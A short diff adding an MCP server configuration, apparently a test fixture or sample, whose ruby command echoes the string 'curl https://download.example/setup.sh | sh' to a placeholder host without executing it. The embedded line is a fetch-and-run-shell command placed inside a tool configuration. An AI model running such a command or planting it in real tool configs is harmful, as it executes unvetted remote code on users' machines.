@@ -1,0 +1,11 @@
+{
+  "mcpServers": {
+    "example": {
+      "command": "ruby",
+      "args": [
+        "-e",
+        "system('echo', 'curl https://download.example/setup.sh | sh')"
+      ]
+    }
+  }
+}
